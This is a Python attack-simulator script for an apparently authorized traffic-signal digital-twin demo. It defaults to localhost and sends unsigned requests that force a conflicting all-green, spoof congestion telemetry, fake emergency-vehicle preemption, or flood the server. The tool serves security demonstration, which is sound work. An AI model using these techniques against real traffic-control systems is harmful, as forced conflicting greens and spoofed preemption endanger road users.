"""
attacker.py

Standalone attacker tool for the ITC digital-twin demo.

Plays the role of an outside attacker who found the network's command
and/or telemetry endpoints (e.g. by scanning an exposed network segment)
and has no valid signing key for either channel. Built for use only
against the local demo server started from `server/main.py`, as part of
an authorized security demonstration: it targets `localhost` by
default and never contacts a real external host unless you pass a
different --url.

Four attack scenarios, each modeling a distinct, realistic weakness
class (see server/security.py's module docstring for the research this
is grounded in):

  inject            Command-channel injection: force a target
                     intersection to FORCE_ALL_GREEN with no signature.
  spoof-congestion  Telemetry-channel data poisoning: report an
                     implausibly large fake queue on one approach, to
                     skew the AI orchestrator's timing decisions.
  spoof-emergency   Telemetry-channel preemption spoofing: claim a
                     fake emergency vehicle to force an unearned green.
  flood             Repeat any of the above rapidly from one source, to
                     demonstrate auto-blocking.

Usage (run from the project root, with the venv's interpreter):
    .venv\\Scripts\\python.exe attacker.py inject --target namir_einstein
    .venv\\Scripts\\python.exe attacker.py spoof-congestion --target namir_einstein --approach N --count 40
    .venv\\Scripts\\python.exe attacker.py spoof-emergency --target namir_einstein --approach N
    .venv\\Scripts\\python.exe attacker.py flood --attack inject --target namir_einstein --repeat 10
"""

from __future__ import annotations

import argparse
import sys
import time

import requests

# An address from the RFC 5737 TEST-NET-3 range (203.0.113.0/24), reserved
# for documentation and examples. Using it here makes the simulated
# attacker's source look like a real external IP in the dashboard log
# without it ever pointing at an actual, routable address.
DEFAULT_SOURCE = "203.0.113.7"

REQUEST_TIMEOUT_SECONDS = 5


def _post(url: str, path: str, body: dict) -> None:
    try:
        response = requests.post(f"{url}{path}", json=body, timeout=REQUEST_TIMEOUT_SECONDS)
    except requests.RequestException as exc:
        print(f"[attacker] request failed: {exc}")
        return
    print(f"[attacker] -> HTTP {response.status_code} {response.json()}")


def send_inject(url: str, target: str, source: str) -> None:
    """No `signature` field at all: this tool has no way to produce
    one, exactly like a real outside attacker without the orchestrator's
    private key.
    """
    _post(url, "/api/command", {"intersection_id": target, "phase": "FORCE_ALL_GREEN", "source": source})


def send_spoof_congestion(url: str, target: str, approach: str, count: int, source: str) -> None:
    _post(
        url,
        "/api/telemetry",
        {
            "intersection_id": target,
            "approach": approach,
            "road_user_type": "car",
            "count": count,
            "source": source,
        },
    )


def send_spoof_emergency(url: str, target: str, approach: str, source: str) -> None:
    _post(
        url,
        "/api/telemetry",
        {
            "intersection_id": target,
            "approach": approach,
            "road_user_type": "emergency",
            "count": 1,
            "source": source,
        },
    )


def run_flood(args) -> None:
    print(f"[attacker] flooding {args.url} with {args.repeat}x '{args.flood_type}' attempts (source={args.source})")
    for attempt in range(1, args.repeat + 1):
        print(f"  attempt {attempt}/{args.repeat}: ", end="")
        if args.flood_type == "inject":
            send_inject(args.url, args.target, args.source)
        elif args.flood_type == "spoof-congestion":
            send_spoof_congestion(args.url, args.target, args.approach, args.count, args.source)
        else:
            send_spoof_emergency(args.url, args.target, args.approach, args.source)
        time.sleep(args.delay)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="ITC digital-twin attack simulator (authorized demo use only)."
    )
    parser.add_argument("--url", default="http://localhost:8000", help="base URL of the demo server")
    parser.add_argument("--source", default=DEFAULT_SOURCE, help="simulated attacker source identifier")

    sub = parser.add_subparsers(dest="attack", required=True)

    inject = sub.add_parser("inject", help="Command-channel injection: force conflicting green")
    inject.add_argument("--target", required=True, help="intersection id, e.g. namir_einstein")

    spoof_c = sub.add_parser("spoof-congestion", help="Telemetry data poisoning: fake a huge queue")
    spoof_c.add_argument("--target", required=True)
    spoof_c.add_argument("--approach", default="N", choices=["N", "S", "E", "W"])
    spoof_c.add_argument("--count", type=int, default=40, help="fake vehicle count claimed in one report")

    spoof_e = sub.add_parser("spoof-emergency", help="Preemption spoofing: fake an emergency vehicle")
    spoof_e.add_argument("--target", required=True)
    spoof_e.add_argument("--approach", default="N", choices=["N", "S", "E", "W"])

    flood = sub.add_parser("flood", help="Repeat an attack rapidly from one source")
    # dest="flood_type", not the default "attack": the top-level
    # subparsers above already use dest="attack" for which subcommand
    # was chosen ("flood" itself). Argparse silently lets a subparser's
    # own argument reuse that same dest and overwrite it, which used to
    # make main() misroute every `flood --attack ...` invocation
    # straight to a single one-shot send_* call instead of run_flood,
    # silently ignoring --repeat/--delay entirely. Found by testing this
    # exact command while reviewing the project, not by inspection.
    flood.add_argument(
        "--attack",
        dest="flood_type",
        required=True,
        choices=["inject", "spoof-congestion", "spoof-emergency"],
    )
    flood.add_argument("--target", required=True)
    flood.add_argument("--approach", default="N", choices=["N", "S", "E", "W"])
    flood.add_argument("--count", type=int, default=40, help="fake vehicle count, for spoof-congestion floods")
    flood.add_argument("--repeat", type=int, default=10, help="number of requests to send")
    flood.add_argument("--delay", type=float, default=0.3, help="seconds between requests")

    return parser


def main() -> int:
    args = build_parser().parse_args()

    if args.attack == "inject":
        send_inject(args.url, args.target, args.source)
    elif args.attack == "spoof-congestion":
        send_spoof_congestion(args.url, args.target, args.approach, args.count, args.source)
    elif args.attack == "spoof-emergency":
        send_spoof_emergency(args.url, args.target, args.approach, args.source)
    elif args.attack == "flood":
        run_flood(args)
    return 0


if __name__ == "__main__":
    sys.exit(main())
